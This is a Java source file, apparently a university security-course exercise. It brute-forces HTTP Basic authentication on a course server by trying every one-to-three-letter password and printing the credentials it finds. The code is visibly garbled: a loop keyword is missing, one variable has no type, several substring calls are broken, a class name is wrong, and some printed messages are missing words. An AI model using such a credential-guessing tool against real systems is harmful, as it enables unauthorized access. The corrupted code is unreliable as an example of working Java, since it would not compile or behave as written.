






























import java.io.*;
import java.net.*;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;

public class BruteForce {

   public static void main(String[] args) throws IOException {

      
      int start , end, total;
      start = System.currentTimeMillis(); 

      String username = "";
      String password = null;
      String host = "http://sec-crack.cs.rmit.edu./SEC/2/";

      
      
      String letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      int lettersLen = letters.length(); 
      int passwordLen=3; 

      int passwords=0; 
      int twoChar=0; 

      url.misc.BASE64Encoder base = new url.misc.BASE64Encoder();
      

      
      String authenticate = ""; 
      String realm = null, domain = null, hostname = null;
       header = null; 

      
      int responseCode;
      String responseMsg;

      
      int temp1=0;
      int temp2=0;
      int temp3=0;


      
      
      
      for (int a=1; a<=passwordLen; a++) {
        temp1  = (int) Math.pow(lettersLen, a);
         passwords += temp1;
         if (a==2) {
            twoChar = temp1; 
         }
      }

      System.out.println("Brute Attack  " + host + " has commenced.");
      System.out.println("Number of possible password combinations: " + passwords);


      int i=1; 

       {
         try {
            
            URL url = new URL(host);
            HttpURLConnection httpConnect = (HttpURLConnection) url.openConnection();

            
            if(realm != null) {

               
               if ( i < lettersLen) {
                  

                   password = letters.substring(i, (i+1));

               } else if (i < (lettersLen + twoChar)) {
                   

                   
                   temp1 = i / lettersLen;
                   password = letters.substring((-1), start );

                   
                   temp1 = i - ( temp1 * lettersLen);
                   password = password + letters.substring(temp1, (+1));

               } else {
                   

                   
                   temp2 = i / lettersLen;
                   temp1 = i - (temp2 * lettersLen);
                   password = letters.substring(temp1, (+1));

                   
                   temp3 = temp2; 
                   temp2 = temp2 / lettersLen;
                   temp1  = temp3 - (temp2 * lettersLen);
                   password = letters.substring(temp1, (+1)) + password;

                   
                   temp3 = temp2; 
                   temp2 = temp2 / lettersLen;
                   temp1 = temp3 - (temp2 * lettersLen);
                   password = letters.substring(temp1, (+1)) + password;

               } 

               
               
               authenticate = username + ":" + password;
               authenticate = new String(base.encode(authenticate.getBytes()));
               httpConnect.addRequestProperty("Authorization", " " + authenticate);

            } 

            
            httpConnect.connect();

            
            realm = httpConnect.getHeaderField("WWW-Authenticate");
            if (realm != null) {
               realm = realm.substring(realm.indexOf('"') + 1);
               realm = realm.substring(0, realm.indexOf('"'));
            }

            hostname = url.getHost();

            
            responseCode = httpConnect.getResponseCode();
            responseMsg = httpConnect.getResponseMessage();

            
            
            
            
            

            
            
            if (responseCode == 200) {
               
               end = System.currentTimeMillis();
               total = (end - start) / 1000; 

               System.out.println ("Sucessfully Connected  " + url);
               System.out.println("Login Attempts Required : " + (i-1));
               System.out.println("Time Taken in Seconds : " + total);
               System.out.println ("Connection Status : " + responseCode + " " + responseMsg);
               System.out.println ("Username : " + username);
               System.out.println ("Password : " + password);
               System.exit( 0 );
            } else if (responseCode == 401 && realm != null) {
               
               
               
               if (i > 1) {

               }
            } else {
               
               
                System.out.println ("What the?... The server replied with  unexpected reponse." );
               System.out.println (" Unexpected Error Occured While Attempting  Connect  " + url);
               System.out.println ("Connection Status: " + responseCode + responseMsg);
               System.out.println ("Unfortunately the password could not  recovered.");
               System.exit( 0 );
           }

           i++;

        } catch(MalformedURLException e) {
           System.out.println("Opps, the URL " + host + " is not valid.");
           System.out.println("Please check the URL and try again.");
        } catch(IOException e) {
           System.out.println(", 't connect  " + host + ".");
           System.out.println("Please check the URL and try again.");
           System.out.println("Other possible causes include website is currently unavailable");
           System.out.println("  have  internet connection problem.");
        } 

     }  while(realm != null); 


   }
}